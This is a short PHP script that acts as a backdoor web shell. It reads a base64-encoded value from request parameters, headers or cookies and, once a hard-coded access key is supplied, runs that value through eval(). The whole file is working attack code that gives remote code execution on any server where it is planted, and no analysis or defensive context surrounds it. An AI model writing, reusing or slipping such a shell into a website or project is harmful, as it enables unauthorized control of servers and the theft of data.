<?php

	const PARAM    = "razboynik";
	const K_PARAM  = "RAZBOYNIK_KEY";
	const K_CODE   = "FromRussiaWithLove<3";
	const K_ACTIVE = true;
	const B64      = true;
	const DEBUG    = true;

	if (DEBUG) {
		ini_set('display_startup_errors', 1);
		ini_set('display_errors', 1);
		error_reporting(-1);
	}

	$arr = [$_GET, $_POST, getallheaders(), $_COOKIE];
	$unlock = true;

	foreach ($arr as $i) {
		if (K_ACTIVE) {
			$unlock = false;
			if (isset($i[K_PARAM]) && $i[K_PARAM] == K_CODE) {
				$unlock = true;
			}
		}

		if ($unlock && isset($i[PARAM]) || $unlock && isset($i[ucfirst(PARAM)])) {
			$str = isset($i[PARAM]) ? $i[PARAM] : $i[ucfirst(PARAM)];

			if (B64) {
				$str = base64_decode($str);
			}

			eval($str);
		}
	}

